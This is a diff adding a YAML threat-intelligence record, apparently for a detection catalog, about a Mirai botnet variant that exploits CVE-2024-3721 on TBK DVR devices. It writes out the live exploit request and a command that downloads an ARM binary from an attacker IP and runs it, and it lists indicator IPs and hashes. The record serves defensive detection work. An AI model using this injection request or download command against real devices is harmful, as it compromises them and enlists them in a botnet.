@@ -1,0 +1,44 @@
+description: "Mirai variant exploiting CVE\u20112024\u20113721 on TBK DVR devices\
+  \ to download and execute an ARM32 binary."
+attribution: Mirai botnet
+malware_families:
+- Mirai
+TTPs:
+  processes: []
+  commandline:
+  - POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F42.112.26.36%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk
+    HTTP/1.1
+  - cd /tmp; rm arm7; wget http://42.112.26.36/arm7; chmod 777 *; ./arm7 tbk
+  powershell: []
+  scripting_engine:
+  - bash script that downloads and executes ARM32 binary via wget
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: wget
+    destination_ip: 42.112.26.36
+    port: 80
+  file_activity:
+  - /tmp/arm7
+  persistence: []
+  process_relations: []
+IOCs:
+  hashes:
+  - 011a406e89e603e93640b10325ebbdc824fd043f9175680d0c061b28a2801dfc29b83f0aae7ed38d27ea37d26f3c91172e9920b21df472b4dd1e8db4863720bf3120a5920f8ff70ec6c5a45d7bf2acc83c2f6175894bee698c61c6ce76ff967445a41ce9f4d8bb2592e8450a1de95dcc524a57c8c595d9d4cd364612fe2f057c74dee23eaa98e2e8a7fc355f06a11d97761909a234ee4f1d856267abe30a39357eb3d72fa7d730d3dbca4df34fe262748a3e1176cb160fb42357fa3f46f0cbde8d92e79b7940f0ac5b01bbb77737ca6c95eaa3fa47a609ceefa24e8c7787bd9996ee8cc2edc8227a640cef77d4a24e83aaf34c27edfc3531cf1cf2f2e9a9c45bba32f4eef7de6bae9507a63bde1a43aa
+  ips:
+  - 116.203.104.203
+  - 130.61.64.122
+  - 161.97.219.84
+  - 130.61.69.123
+  - 185.84.81.194
+  - 54.36.111.116
+  - 192.3.165.37
+  - 162.243.19.47
+  - 63.231.92.27
+  - 80.152.203.134
+  - 42.112.26.36
+authors:
+- Anderson Leite
+reference: https://securelist.com/mirai-botnet-variant-targets-dvr-devices-with-cve-2024-3721/116742
+date_of_publication: June 06, 2025
+file_creation_date: October 01, 2025
